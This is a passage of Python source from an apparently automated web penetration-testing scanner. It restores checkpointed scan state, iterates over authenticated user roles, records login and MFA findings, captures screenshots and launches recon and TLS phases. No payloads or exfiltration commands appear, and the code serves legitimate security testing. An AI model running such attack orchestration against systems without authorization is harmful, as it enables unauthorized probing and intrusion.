                    # Move its output files to _interrupted/ so the phase can
                    # write fresh data without appending to partial files.
                    _sph_base = _sph.split("#")[0]  # strip role suffix
                    _sph_role = _sph.split("#")[1] if "#" in _sph else ""
                    # Try role-specific subdir first, then phase-level dir
                    _sph_candidates = []
                    if _sph_role:
                        _sph_candidates.append(out.root / _sph_base / _sph_role)
                    _sph_candidates.append(out.root / _sph_base)
                    for _sph_dir in _sph_candidates:
                        if _sph_dir.is_dir():
                            try:
                                _stash_target = _interrupted_dir / _sph_dir.name
                                _stash_target.mkdir(parents=True, exist_ok=True)
                                for _sf in _sph_dir.iterdir():
                                    try:
                                        shutil.move(str(_sf),
                                                    str(_stash_target / _sf.name))
                                    except Exception:
                                        pass
                                vc.log(
                                    f"[resume] Moved interrupted output: "
                                    f"{_sph_dir.name} → _interrupted/{_interrupted_ts}/",
                                    "INFO",
                                )
                            except Exception:
                                pass
                            break
            _n_restored = sum(
                1 for _v in _rstate.get("phase_status", {}).values()
                if _v.get("status") == "complete"
            )
            _n_pending = sum(
                1 for _v in _rstate.get("phase_status", {}).values()
                if _v.get("status") == "pending"
            )
            vc.log(
                f"[resume] Restored {_n_restored} completed phase(s), "
                f"{_n_pending} pending phase(s) will re-run",
                "SUCCESS",
            )

        # ── Checkpoint save closure ──────────────────────────────────────────
        def _save_checkpoint() -> None:
            """Persist full runtime state to checkpoint.json."""
            try:
                pm.save_scan_state({
                    # Auth chain
                    "collected_roles":     _collected_roles,
                    "n_roles":             _n_roles,
                    "role_landing_urls":   dict(_role_landing_urls),
                    "all_roles_ctx":       list(_all_roles_ctx),
                    "role_sessions_auth":  {
                        lbl: _serialize_session_auth(s)
                        for lbl, s in _completed_role_sessions.items()
                    },
                    # Accumulators
                    "ep_base":                    list(_ep_base),
                    "all_crawl_links":            list(_all_crawl_links),
                    "role1_crawl_data":           _role1_crawl_data,
                    "wp_discovered_paths":        list(_wp_discovered_paths),
                    "combined_auth_recon":        _combined_auth_recon,
                    "role1_accessible_endpoints": list(_role1_accessible_endpoints),
                    "discovered_creds_seen":      list(_discovered_creds_seen),
                    # Target state
                    "scan_waf_cdn":          _scan_waf_cdn,
                    "processed_urls":        list(_processed_urls),
                    "pending_urls":          list(_pending_urls),
                    "pending_idx":           _pending_idx,
                    "redirect_discovered":   list(_redirect_discovered),
                    "scope_hostnames":       list(_scope_hostnames),
                    "current_target_url":    raw_url,
                    # Discovery
                    "discovery_leader":       _discovery_leader,
                    "discovery_leader_score": dict(_discovery_leader_score),
                    # Wildcard baseline (small dict or None)
                    "wc_baseline":           wc_baseline,
                    # Metadata
                    "fracture_version":      VERSION,
                })
            except Exception as _cpe:
                vc.log(f"[checkpoint] Save error: {_cpe}", "WARNING")

        if _pause_mgr is not None:
            _pause_mgr._checkpoint_cb = _save_checkpoint

        # ── Per-credential context loop ─────────────────────────────────────
        _ss_login_done: set = set()  # dedup: login URLs already screenshotted
        for _ctx in _cred_contexts:
            _check_pause()
            _ctx_label = _ctx["label"]
            _scan_ctx["role"] = _ctx_label  # route structure_map statuses to this role's column
            _ctx_auth  = _ctx["auth_sess"]
            _ctx_cfg   = _ctx["cfg"]
            # True for roles 2..n and unauthenticated in multi-role mode.
            # Reduced contexts skip discovery/crawl/injection and most attack phases;
            # they only test access to paths already found by role 1.
            _is_reduced_ctx = _ctx.get("reduced", False)

            # Route tool output files into per-role subdirectories when multi-role
            # scanning is active so that results from different roles do not overwrite
            # each other (e.g. recon/Admin/gobuster_... vs recon/User/gobuster_...).
            out._output_role = _ctx_label if _n_roles >= 1 else ""

            # Lazy auth build for Roles 2..n in CRUCIBLE_MANAGED multi-role mode.
            # Sessions are not pre-built so browser-auth prompts appear after the
            # previous role's phases complete, not before any phases run.
            # Browser-auth fallback is handled inside _build_auth_session (form_login
            # path) where _browser_assisted_login is in closure scope — it cannot be
            # called from here.
            # For redirect-discovered secondary targets, reuse the session that was
            # established on the primary target rather than re-running the login flow.
            if _ctx_auth is None and _ctx_label != "unauthenticated" and _ctx.get("multi_role"):
                _role_idx = _ctx.get("role_idx", -1)
                if _is_redirect_target and _role_idx in _role_sessions:
                    _ctx_auth = _role_sessions[_role_idx]
                    vc.log(
                        f"[auth] Reusing '{_ctx_label}' session for redirect target {raw_url}",
                        "INFO",
                    )
                else:
                    _ctx_auth = _build_auth_session(
                        _ctx_cfg, "auth", _scope_hostnames, role_label=_ctx_label,
                        no_interactive=_is_redirect_target)
                    if _ctx_auth and _role_idx >= 0:
                        _role_sessions[_role_idx] = _ctx_auth
                if _ctx_auth:
                    _attach_redirect_hook(_ctx_auth, _scope_hostnames, target, out, _in_scope_new)
                _ctx["auth_sess"] = _ctx_auth

            # Set auth context so all findings in this pass carry the account.
            # Use UNAUTH when auth is absent — either this is the unauthenticated
            # context OR authentication was attempted but failed (_ctx_auth is None).
            # Never tag findings with a role label that was never actually established.
            if _ctx_label == "unauthenticated" or _ctx_auth is None:
                out.set_auth_context([{"username": "UNAUTH", "role": "unauthenticated"}])
            else:
                _ctx_user = (_ctx_cfg.get("auth", {}).get("username") or "").strip() or _ctx_label
                out.set_auth_context([{"username": _ctx_user, "role": _ctx_label}])

            # Emit an INFO finding whenever a login page was discovered so there
            # is an explicit record of where authentication happens, visible in
            # Crucible's Findings tab.  Emit for all authenticated contexts that
            # have a login URL — including SPAs where the entry point URL equals
            # the base target URL (browser redirects to CAS/SSO from there).
            try:
                _lp_found_url = (
                    _ctx_cfg.get("auth", {}).get("login_url", "").strip()
                )
                vc.log(
                    f"[auth] login_url for finding ({_ctx_label}): "
                    f"{_lp_found_url!r}",
                    "INFO",
                )
                if (_ctx_label != "unauthenticated"
                        and _lp_found_url):
                    _lp_role_sfx = f" (role: {_ctx_label})" if _ctx_label else ""
                    _lp_rel = urllib.parse.urlparse(_lp_found_url).path or "/"
                    # Save the login page HTML as evidence: one GET via the
                    # operator-facing session captures the form HTML the
                    # operator should review (CSRF token format, hidden
                    # fields, anti-brute-force markers, framework hints).
                    _lp_evidence = ""
                    try:
                        _lp_probe_sess = _make_session(_ctx_cfg)
                        _lp_r = _lp_probe_sess.get(
                            _lp_found_url, timeout=cfg.get("timeout", 10))
                        _lp_rq, _lp_rp = _save_http_evidence(
                            out, "auth_recon",
                            f"login_page_{_ctx_label}",
                            _lp_r,
                        )
                        _lp_evidence = json.dumps([{
                            "url":  f"LOGIN PAGE  GET {_lp_found_url}",
                            "req":  str(_lp_rq),
                            "resp": str(_lp_rp),
                        }])
                    except Exception:
                        pass
                    out.add_finding(
                        title="Login Page Identified",
                        url=_lp_found_url,
                        port=target["port"],
                        risk="INFO",
                        description=(
                            f"A login page was identified at {_lp_found_url}"
                            f"{_lp_role_sfx}. This is the authentication entry "
                            f"point used during testing. The captured page "
                            f"HTML is available in the Evidence panel."
                        ),
                        affected=_lp_rel,
                        output=(
                            f"Login URL: {_lp_found_url}\n"
                            f"Role:      {_ctx_label}\n"
                            f"Path:      {_lp_rel}"
                        ),
                        output_file=_lp_evidence,
                        sources="fracture-auth",
                        service=target["scheme"],
                        owasp="A07:2025 Identification and Authentication Failures",
                        nist="IA-8",
                        remediation=(
                            "Ensure the login page enforces HTTPS, uses "
                            "anti-brute-force controls, and does not disclose "
                            "version or framework information."
                        ),
                    )
            except Exception as _lp_ex:
                vc.log(f"[auth] Login Page Discovered finding error: {_lp_ex}", "WARNING")

            # Emit an INFO finding when MFA was detected during authentication.
            try:
                _mfa_detected = _ctx_cfg.get("auth", {}).get("mfa_providers", [])
                if (_ctx_label != "unauthenticated" and _mfa_detected):
                    _mfa_str = ", ".join(_mfa_detected)
                    _mfa_url = (
                        _ctx_cfg.get("auth", {}).get("login_url", "").strip()
                        or target["url"]
                    )
                    # Evidence is metadata about WHERE / HOW MFA was
                    # detected. Capture two things:
                    #   1. A re-fetch of the MFA-host URL so the operator
                    #      can review the challenge page HTML.
                    #   2. A synthetic summary file listing every provider
                    #      detected and the auth flow context.
                    _mfa_evidence: list = []
                    try:
                        _mfa_probe_sess = _make_session(_ctx_cfg)
                        _mfa_r = _mfa_probe_sess.get(
                            _mfa_url, timeout=cfg.get("timeout", 10))
                        _mfa_rq, _mfa_rp = _save_http_evidence(
                            out, "auth_recon",
                            f"mfa_challenge_{_ctx_label}",
                            _mfa_r,
                        )
                        _mfa_evidence.append({
                            "url":  f"MFA HOST URL  GET {_mfa_url}",
                            "req":  str(_mfa_rq),
                            "resp": str(_mfa_rp),
                        })
                    except Exception:
                        pass
                    try:
                        _mfa_summary_path = out.output_path(
                            "auth_recon",
                            f"mfa_detection_summary_{_ctx_label}",
                        )
                        _mfa_summary_body = (
                            f"MFA detection summary\n"
                            f"=====================\n"
                            f"Role:               {_ctx_label}\n"
                            f"MFA host URL:       {_mfa_url}\n"
                            f"Providers detected: {_mfa_str}\n"
                            f"Provider count:     {len(_mfa_detected)}\n"
                            f"\nProvider names (one per line):\n"
                            + "\n".join(f"  - {_p}" for _p in _mfa_detected)
                            + "\n"
                        )
                        _mfa_summary_path.write_text(
                            _mfa_summary_body, encoding="utf-8")
                        _mfa_evidence.append({
                            "url":  f"DETECTION SUMMARY  {_mfa_summary_path.name}",
                            "file": str(_mfa_summary_path),
                        })
                    except Exception:
                        pass
                    out.add_finding(
                        title="Multi-Factor Authentication Detected",
                        url=_mfa_url,
                        port=target["port"],
                        risk="INFO",
                        description=(
                            f"Multi-factor authentication was detected "
                            f"during the login process. Provider(s) "
                            f"identified: {_mfa_str}. The captured MFA "
                            f"challenge page HTML and a detection summary "
                            f"are saved as evidence."
                        ),
                        affected=urllib.parse.urlparse(_mfa_url).path or "/",
                        output=(
                            f"Role:               {_ctx_label}\n"
                            f"MFA URL:            {_mfa_url}\n"
                            f"Providers ({len(_mfa_detected)}): {_mfa_str}"
                        ),
                        output_file=(
                            json.dumps(_mfa_evidence)
                            if _mfa_evidence else ""
                        ),
                        sources="fracture-auth",
                        service=target["scheme"],
                        owasp="A07:2025 Identification and Authentication Failures",
                        nist="IA-3",
                        remediation=(
                            "MFA adds a valuable authentication layer. Ensure the "
                            "MFA implementation is resistant to bypass and phishing "
                            "(e.g., prefer TOTP or hardware tokens over SMS)."
                        ),
                    )
            except Exception as _mfa_ex:
                vc.log(f"[auth] MFA finding error: {_mfa_ex}", "WARNING")

            # ── Write authentication_status.json entry for this role ──────────
            # Probe the base target URL with this session to capture the
            # post-login landing page (URL, HTTP code, and a body snippet for
            # the Crucible Authentication tab pop-up preview).
            # For the unauthenticated context, use effective_auth (the fresh
            # unauthenticated session) so that unauthenticated cookies set by the
            # server during the scan are visible in the Crucible Auth tab.
            try:
                _as_username = (
                    "" if _ctx_label == "unauthenticated"
                    else (_ctx_cfg.get("auth", {}).get("username") or "").strip() or _ctx_label
                )
                _as_status = (
                    "unauthenticated" if _ctx_label == "unauthenticated"
                    else ("success" if _ctx_auth is not None else "failed")
                )
                # Use multi-signal verification result when available
                _as_auth_verified = _ctx_cfg.get("auth", {}).get("auth_verified")
                if _as_auth_verified is not None and not _as_auth_verified:
                    _as_status = "failed"
                _as_landing_url = ""
                _as_landing_code = 0
                _as_landing_body = ""
                _as_canary_url = ""   # requests-viable URL for canary cross-checks
                _as_canary_code = 0
                # Session to probe with: authenticated session for auth contexts.
                # For the unauthenticated context, use a FRESH session — not
                # effective_auth (which at this point still holds the PREVIOUS
                # context's session and would leak that role's cookies into
                # the unauthenticated auth-status entry).
                if _ctx_auth is not None:
                    _as_session = _ctx_auth
                elif _ctx_label == "unauthenticated":
                    _as_session = _make_session(_ctx_cfg, _scope_hostnames)
                else:
                    _as_session = _make_session(_ctx_cfg, _scope_hostnames)
                try:
                    _as_r = _as_session.get(
                        target["url"], timeout=cfg.get("timeout", 10),
                        allow_redirects=True,
                    )
                    _as_landing_url  = _as_r.url
                    _as_landing_code = _as_r.status_code
                    _as_landing_body = _as_r.text[:8192]
                    _as_canary_url   = _as_r.url
                    _as_canary_code  = _as_r.status_code
                except Exception:
                    pass
                # ── SPA landing page resolution ──────────────────────────
                # For SPAs with API auth, the server returns the same HTML
                # shell for every path (always 200, same <div id="root">).
                # The actual post-login page is a client-side JS redirect
                # invisible to requests.  Use headless Chrome with the
                # auth cookies to discover the real landing URL.
                if (_ctx_auth is not None
                        and _as_status == "success"
                        and _as_landing_url):
                    try:
                        _target_path = urllib.parse.urlparse(
                            target["url"]).path.rstrip("/").lower()
                        _landing_path = urllib.parse.urlparse(
                            _as_landing_url).path.rstrip("/").lower()
                        _last_seg = _landing_path.rsplit("/", 1)[-1]
                        _still_on_login = (
                            _landing_path == _target_path
                            or _last_seg == "login")
                        # SPA auth cookie bypass — same logic as
                        # the early check at _early_on_login: when
                        # auth session cookies look like session
                        # tokens, skip headless resolution (the app
                        # is a client-side SPA already authenticated).
                        if _still_on_login and _as_session:
                            _spa_auth_names = (
                                "authtoken", "idtoken", "id_token",
                                "access_token", "accesstoken",
                                "refreshtoken", "refresh_token",
                                "jwt", "bearer", "session_token",
                                "x-auth", "sid",
                            )
                            for _ac in _as_session.cookies:
                                if any(k in _ac.name.lower()
                                       for k in _spa_auth_names):
                                    _still_on_login = False
                                    vc.log(
                                        "[auth] Landing URL matches "
                                        "target URL but auth cookies "
                                        "present (SPA) — skipping "
                                        "late headless resolution",
                                        "INFO",
                                    )
                                    break
                        if _still_on_login:
                            vc.log(
                                "[auth] Landing page is still the login URL "
                                "— using headless browser to resolve "
                                "actual post-login URL",
                                "INFO",
                            )
                            try:
                                _spa_lnd_url = _resolve_spa_landing(
                                    target, _ctx_cfg, _ctx_auth, target["url"])
                                if _spa_lnd_url:
                                    _spa_lnd_path = urllib.parse.urlparse(
                                        _spa_lnd_url).path.rstrip("/").lower()
                                    _spa_seg = _spa_lnd_path.rsplit(
                                        "/", 1)[-1]
                                    if (_spa_lnd_path != _target_path
                                            and _spa_seg != "login"):
                                        _late_browser_only = False
                                        try:
                                            _lv = _as_session.get(
                                                _spa_lnd_url,
                                                timeout=cfg.get("timeout", 10),
                                                allow_redirects=False,
                                            )
                                            if _lv.status_code in (
                                                    301, 302, 303, 307, 308):
                                                _rto = (
                                                    _lv.headers
                                                    .get("Location", ""))
                                                _rtos = (
                                                    urllib.parse.urlparse(
                                                        _rto)
                                                    .path.rsplit("/", 1)[-1]
                                                    .lower())
                                                if _rtos == "login":
                                                    _late_browser_only = True
                                        except Exception:
                                            pass
                                        _as_landing_url = _spa_lnd_url
                                        if _late_browser_only:
                                            vc.log(
                                                f"[auth] Post-login URL "
                                                f"(browser-only): "
                                                f"{_spa_lnd_url} — "
                                                f"requests session gets 302 "
                                                f"to login; displayed but "
                                                f"NOT used as scan seed",
                                                "WARNING",
                                            )
                                            _as_landing_code = 302
                                        else:
                                            vc.log(
                                                f"[auth] Post-login URL: "
                                                f"{_spa_lnd_url}",
                                                "SUCCESS",
                                            )
                                            cfg["_auth_needs_spa_resolve"] = True
                                            _as_landing_code = 200
                                            try:
                                                _spa_body_r = (
                                                    _as_session.get(
                                                        _spa_lnd_url,
                                                        timeout=cfg.get(
                                                            "timeout", 10),
                                                        allow_redirects=True,
                                                    ))
                                                _as_landing_body = (
                                                    _spa_body_r.text[:8192])
                                            except Exception:
                                                pass
                                    else:
                                        vc.log(
                                            f"[auth] Browser stayed on "
                                            f"login: {_spa_lnd_url}",
                                            "INFO",
                                        )
                                else:
                                    vc.log(
                                        "[auth] Headless browser returned "
                                        "no URL",
                                        "INFO",
                                    )
                            except Exception as _spa_e:
                                vc.log(
                                    f"[auth] Landing resolution failed: "
                                    f"{_spa_e}",
                                    "WARNING",
                                )
                    except Exception:
                        pass
                _write_auth_status(
                    out.root, _ctx_label, _as_username, _as_status,
                    _as_session, _as_landing_url, _as_landing_body, _as_landing_code,
                )

                # Screenshot the login URL and the authenticated landing URL.
                # Phase 0b only screenshots the base target URL; for SPA/SSO apps
                # the login page (CAS, Okta, ADFS, …) and the post-login landing
                # page are different URLs that are never visited by gobuster or the
                # static crawl, so they would never otherwise be captured.
                _ss_save_dir  = out.root / "recon"
                _ss_save_dir.mkdir(parents=True, exist_ok=True)
                _ss_safe_host = target["hostname"].replace(".", "_")
                _ss_port      = target["port"]
                _ss_role_slug = _ctx_label.replace(" ", "_").lower()
                _ss_base_norm = target["url"].rstrip("/")
                _ss_login_url = ""

                # Login URL screenshot — always capture unless it's an API
                # endpoint (not a visual page) or auth is not in use.
                # Phase 0b captures the target URL unauthenticated; we
                # still take a per-role login screenshot so the report
                # explicitly shows "Login Page" evidence.
                if _ctx_auth is not None and not _is_reduced_ctx:
                    _ss_login_url = (
                        _ctx_cfg.get("auth", {}).get("login_url", "").strip()
                        or ""
                    )
                    # If no explicit login_url, use the target URL (which is
                    # typically the login page).
                    if not _ss_login_url:
                        _ss_login_url = target["url"]
                    # Detect API-only login endpoints: path contains /api/
                    # (case-insensitive).  API endpoints are not visual pages
                    # — fall back to the target URL for the screenshot since
                    # that is typically the visual login form.
                    _ss_login_is_api = False
                    if _ss_login_url:
                        _ss_lp_lower = urllib.parse.urlparse(
                            _ss_login_url).path.lower()
                        _ss_login_is_api = "/api/" in _ss_lp_lower
                    if _ss_login_is_api:
                        _ss_login_url = target["url"]
                        _ss_login_is_api = False
                    if (_ss_login_url
                            and not _ss_login_is_api
                            and _ss_login_url.rstrip("/") not in _ss_login_done):
                        _ss_login_done.add(_ss_login_url.rstrip("/"))
                        try:
                            _ss_lp = (
                                _ss_save_dir
                                / f"screenshot_{_ss_safe_host}_{_ss_port}"
                                  f"_login_{_ss_role_slug}.png"
                            )
                            _ss_lp_meta = {}
                            if _capture_screenshot_to(_ss_login_url, _ss_lp, target, cfg, _meta=_ss_lp_meta):
                                _ss_lp_rel = urllib.parse.urlparse(_ss_login_url).path or "/"
                                _ss_lp_code, _ss_lp_srv, _ss_lp_ht, _ss_lp_blen = _probe_screenshot_meta(_ss_login_url)
                                out.record_spa_baseline(_ss_lp_blen)
                                _ss_lp_pt = _ss_lp_meta.get("page_title", "") or _ss_lp_ht
                                _ss_lp_cls = _classify_screenshot(_ss_lp_pt, _ss_lp_srv, _ss_lp_code, url_path=_ss_lp_rel)
                                _ss_lp_cs = f" HTTP {_ss_lp_code}." if _ss_lp_code is not None else ""
                                out.add_finding(
                                    title="Discovery: Web Screenshot Captured",
                                    url=_ss_login_url, port=_ss_port, risk="INFO",
                                    description=(
                                        f"Screenshot of login page for role "
                                        f"'{_ctx_label}': {_ss_login_url}"
                                    ),
                                    affected=_ss_lp_rel,
                                    output=f"Saved: {_ss_lp.name}",
                                    sources="fracture-screenshot",
                                    service=target["scheme"],
                                    output_file=str(_ss_lp),
                                    http_code=_ss_lp_code,
                                    owasp="A05:2025 Security Misconfiguration",
                                    nist="CM-7",
                                    remediation="Review screenshot for exposed sensitive content.",
                                )
                                _register_screenshot(out.root, _ss_lp, url=_ss_login_url,
                                                     ip=target.get("ip", ""), port=_ss_port,
                                                     hostname=target["hostname"], scheme=target["scheme"],
                                                     title=f"Web Screenshot: {_ss_lp_cls}",
                                                     description=f"Login page screenshot ({_ctx_label}).{_ss_lp_cs}",
                                                     classification=_ss_lp_cls,
                                                     status_code=_ss_lp_code,
                                                     server=_ss_lp_srv, page_title=_ss_lp_pt)
                                vc.log(
                                    f"[screenshot] Login page [{_ctx_label}]: {_ss_lp.name}",
                                    "SUCCESS",
                                )
                        except Exception:
                            pass

                # Authenticated landing URL screenshot — the page the
                # session lands on after login.  Always capture: even if the
                # URL matches the base/login URL, the AUTHENTICATED view
                # differs (SPAs render different content based on session
                # cookies, not URL).  Phase 0b's screenshot is unauthenticated.
                if (_as_landing_url
                        and _as_landing_code in range(200, 400)):
                    try:
                        _ss_lnd = (
                            _ss_save_dir
                            / f"screenshot_{_ss_safe_host}_{_ss_port}"
                              f"_landing_{_ss_role_slug}.png"
                        )
                        _ss_lnd_meta = {}
                        if _capture_screenshot_to(
                                _as_landing_url, _ss_lnd, target, cfg,
                                auth_session=_as_session, _meta=_ss_lnd_meta):
                            _ss_lnd_rel = urllib.parse.urlparse(_as_landing_url).path or "/"
                            _ss_lnd_code, _ss_lnd_srv, _ss_lnd_ht, _ss_lnd_blen = _probe_screenshot_meta(
                                _as_landing_url, _as_session)
                            out.record_spa_baseline(_ss_lnd_blen)
                            _ss_lnd_pt = _ss_lnd_meta.get("page_title", "") or _ss_lnd_ht
                            _ss_lnd_cls = _classify_screenshot(_ss_lnd_pt, _ss_lnd_srv,
                                _ss_lnd_code or _as_landing_code, url_path=_ss_lnd_rel)
                            _lnd_ctx = (
                                f" (role: {_ctx_label})"
                                if _ctx_label != "unauthenticated" else ""
                            )
                            _ss_lnd_cs = f" HTTP {_ss_lnd_code or _as_landing_code}."
                            out.add_finding(
                                title="Discovery: Web Screenshot Captured",
                                url=_as_landing_url, port=_ss_port, risk="INFO",
                                description=(
                                    f"Screenshot of authenticated landing page"
                                    f"{_lnd_ctx}: {_as_landing_url}"
                                    f" HTTP {_as_landing_code}."
                                ),
                                affected=_ss_lnd_rel,
                                output=f"Saved: {_ss_lnd.name}",
                                sources="fracture-screenshot",
                                service=target["scheme"],
                                output_file=str(_ss_lnd),
                                http_code=_as_landing_code,
                                owasp="A05:2025 Security Misconfiguration",
                                nist="CM-7",
                                remediation="Review screenshot for exposed sensitive content.",
                            )
                            _register_screenshot(out.root, _ss_lnd, url=_as_landing_url,
                                                 ip=target.get("ip", ""), port=_ss_port,
                                                 hostname=target["hostname"], scheme=target["scheme"],
                                                 title=f"Web Screenshot: {_ss_lnd_cls}",
                                                 description=f"Authenticated landing page{_lnd_ctx}.{_ss_lnd_cs}",
                                                 classification=_ss_lnd_cls,
                                                 status_code=_ss_lnd_code or _as_landing_code,
                                                 server=_ss_lnd_srv, page_title=_ss_lnd_pt)
                            vc.log(
                                f"[screenshot] Landing page [{_ctx_label}]: {_ss_lnd.name}",
                                "SUCCESS",
                            )
                    except Exception:
                        pass

            except Exception:
                pass

            if _ctx_auth:
                vc.log(f"Auth [{_ctx_label}]: enabled", "INFO")
            else:
                vc.log(f"Auth [{_ctx_label}]: none", "INFO")
            if _is_reduced_ctx:
                vc.log(
                    f"[{_ctx_label}] Reduced context — running authorization/session/bypass "
                    f"phases only against role 1 discovered paths", "INFO"
                )

            # Closures capture _ctx_label and _is_reduced_ctx via default arg
            def _skip(phase_name: str, _lbl: str = _ctx_label,
                      _reduced: bool = _is_reduced_ctx) -> bool:
                _check_pause()
                if not phases_enabled.get(phase_name, False):
                    vc.log(f"[{phase_name}] Phase disabled — skipping", "INFO")
                    vc.status(phase_name, phase_name, "skipped")
                    pm.set_phase_status(f"{phase_name}#{_lbl}", "skipped", phase_name)
                    return True
                if pm.is_phase_complete(f"{phase_name}#{_lbl}"):
                    vc.log(f"[{phase_name}] Already complete — skipping (checkpoint)", "INFO")
                    return True
                if _reduced and phase_name not in _REDUCED_SCAN_PHASES:
                    vc.log(
                        f"[{phase_name}] Skipping for reduced context [{_lbl}] — "
                        f"full scan was performed for the most permissive user", "INFO"
                    )
                    vc.status(phase_name, phase_name, "skipped")
                    pm.set_phase_status(f"{phase_name}#{_lbl}", "skipped", phase_name)
                    return True
                return False

            # For reduced contexts seed crawl_data from role 1's results so that
            # auth_bypass / session / csrf phases test the same paths.
            if _is_reduced_ctx:
                crawl_data = copy.deepcopy(_role1_crawl_data)
            else:
                crawl_data = {"forms": [], "params": [], "links": []}
            auth_recon_data = {"forms": [], "links": [], "resource_ids": []}

            # effective_auth: the session used for all requests in this context.
            # For unauthenticated context: ALWAYS a fresh session — never fall back
            # to `sess` (the shared probe session) which accumulates cookies from
            # recon, spider, and redirect GETs made during all prior contexts.
            # Using sess here would carry Role 1's tracking/session cookies into
            # what is supposed to be a clean unauthenticated probe.
            if _ctx_auth is not None:
                effective_auth = _ctx_auth
            elif _ctx_label == "unauthenticated":
                effective_auth = _make_session(_ctx_cfg, _scope_hostnames)
                _attach_redirect_hook(effective_auth, _scope_hostnames, target,
                                      out, _in_scope_new)
            else:
                # Auth was attempted but failed — use a clean session so we don't
                # send stale probe cookies while scanning as this role.
                effective_auth = _make_session(_ctx_cfg, _scope_hostnames)
                _attach_redirect_hook(effective_auth, _scope_hostnames, target,
                                      out, _in_scope_new)

            # ── Seed _ep_base with the post-login landing URL ────────────────
            # After successful auth the server typically redirects to the
            # authenticated landing page (e.g. /Client/MyItems).  This URL is
            # the entry point to the application surface and must be tested.
            # Capture it early so it feeds into crawl, injection, and all
            # subsequent phases.
            # Skip browser-only landing pages (code=302): the requests session
            # gets redirected back to login because the app uses JS-stored
            # auth state, not just cookies.  Display in Crucible but don't
            # feed into the scan — the 302 would generate spurious redirect
            # findings and the crawl would see the login page, not content.
            if (_as_landing_url
                    and _as_landing_code in range(200, 300)
                    and _as_landing_url.rstrip("/") != target["url"].rstrip("/")):
                _lnd_norm = _as_landing_url.rstrip("/")
                if _lnd_norm not in (u.rstrip("/") for u in _ep_base):
                    _ep_base.append(_as_landing_url)
                    vc.log(
                        f"[endpoint-seed] Post-login landing URL added: "
                        f"{_as_landing_url} (HTTP {_as_landing_code})",
                        "INFO",
                    )
                    # Write the landing URL to structure_map immediately so
                    # it appears in the Crucible Status tab and preliminary
                    # access_matrix without waiting for the bulk sync after
                    # gobuster.
                    try:
                        _lnd_path = urllib.parse.urlparse(
                            _as_landing_url).path or "/"
                        _write_structure_map(
                            out, target,
                            path_statuses={_lnd_path: _as_landing_code},
                            source="auth-landing",
                        )
                    except Exception:
                        pass

            # ── Session keepalive ─────────────────────────────────────────
            # Start a background heartbeat so the server session doesn't
            # expire while long-running subprocess phases (nuclei, nikto,
            # gobuster, etc.) leave the requests session idle.
            _keepalive = None
            if (_ctx_auth is not None
                    and _ctx_label != "unauthenticated"):
                try:
                    _ka_sm_path = out.root / "structure_map.json"
                    _ka_sm = (json.loads(_ka_sm_path.read_text())
                              if _ka_sm_path.exists() else None)
                    _ka_landing = (
                        _as_canary_url
                        if _as_canary_url and _as_canary_code == 200
                        else _as_landing_url
                        if _as_landing_url and _as_landing_code == 200
                        else ""
                    )
                    # Read detected session timeout from target_profile
                    _ka_detected_timeout = None
                    try:
                        _ka_tp = json.loads(
                            (out.root / "target_profile.json").read_text()
                        ) if (out.root / "target_profile.json").exists() else {}
                        _ka_st = _ka_tp.get("session_timeout", {})
                        _ka_detected_timeout = _ka_st.get("detected_seconds")
                    except Exception:
                        pass
                    _keepalive = _SessionKeepalive(
                        effective_auth, target, _ctx_cfg, sm_data=_ka_sm,
                        landing_url=_ka_landing,
                        detected_timeout=_ka_detected_timeout)
                    _keepalive.start()
                except Exception:
                    pass

            # ── Discovery phases — Role 1 only ──────────────────────────────
            # All enumeration and server-analysis runs authenticated as the most
            # privileged role to obtain the most comprehensive application surface.
            # Reduced contexts (roles 2..n, unauthenticated) skip this block and
            # reuse the endpoint list collected here.
            if not _is_reduced_ctx:

                # Phase 0: recon (gobuster, whatweb, nikto baseline, etc.)
                if not _skip("recon"):
                    pm.set_phase_status(f"recon#{_ctx_label}", "running", "HTTP Recon")
                    try:
                        wc_baseline, _wp_discovered_paths = _phase_recon(
                            target, _ctx_cfg, pm, out, effective_auth,
                            landing_url=_as_canary_url or _as_landing_url or "")
                        pm.set_phase_status(f"recon#{_ctx_label}", "complete", "HTTP Recon")
                        _save_checkpoint()
                    except Exception as e:
                        vc.error(f"Phase recon [{_ctx_label}] error: {e}")
                        out.log_error("recon", "phase-level exception", str(e))
                        pm.set_phase_status(f"recon#{_ctx_label}", "error", detail=str(e))

                # Read CDN/WAF from target_profile — used to modulate injection phases.
                # Written by _phase_recon; read here so all subsequent phases can
                # access it without requiring changes to every phase signature.
                try:
                    _tp = json.loads((out.root / "target_profile.json").read_text())
                    _scan_waf_cdn = _tp.get("cdn", "") or ""
                    if not _scan_waf_cdn and _tp.get("edge_security"):
                        _scan_waf_cdn = _tp["edge_security"][0]
                    # WAF field from the target profile (WAF-tier only, never
                    # LB-only products like F5 BIG-IP / Citrix ADC).
                    if not _scan_waf_cdn:
                        _tp_waf = _tp.get("waf", "") or ""
                        if _tp_waf:
                            _scan_waf_cdn = _tp_waf
                except Exception:
                    _scan_waf_cdn = ""

                # WAF health check — detect IP blocks or session termination early.
                # Only meaningful when a WAF/CDN was identified by _phase_recon.
                if _scan_waf_cdn and effective_auth is not None:
                    _waf_session_health(
                        target["url"], effective_auth, cfg.get("timeout", 10),
                        out, target, _scan_waf_cdn, role_label=_ctx_label,
                    )

                # Phase 0b: screenshot
                if not _skip("screenshot"):
                    pm.set_phase_status(f"screenshot#{_ctx_label}", "running", "Screenshot")
                    try:
                        _phase_screenshot(target, _ctx_cfg, pm, out,
                                          sess=effective_auth)
                        pm.set_phase_status(f"screenshot#{_ctx_label}", "complete", "Screenshot")
                        _save_checkpoint()
                    except Exception as e:
                        vc.error(f"Phase screenshot [{_ctx_label}] error: {e}")
                        pm.set_phase_status(f"screenshot#{_ctx_label}", "error", detail=str(e))

                # Phase 0c: webfiles
                if not _skip("webfiles"):
                    pm.set_phase_status(f"webfiles#{_ctx_label}", "running", "Web Files")
                    try:
                        _phase_webfiles(target, _ctx_cfg, pm, out, effective_auth)
                        pm.set_phase_status(f"webfiles#{_ctx_label}", "complete", "Web Files")
                        _save_checkpoint()
                    except Exception as e:
                        vc.error(f"Phase webfiles [{_ctx_label}] error: {e}")
                        pm.set_phase_status(f"webfiles#{_ctx_label}", "error", detail=str(e))

                # Phase 1: tls
                if not _skip("tls"):
                    pm.set_phase_status(f"tls#{_ctx_label}", "running", "TLS Analysis")
                    try:
                        _phase_tls(target, _ctx_cfg, pm, out, effective_auth)
                        pm.set_phase_status(f"tls#{_ctx_label}", "complete", "TLS Analysis")
                        _save_checkpoint()
                    except Exception as e:
                        vc.error(f"Phase tls [{_ctx_label}] error: {e}")
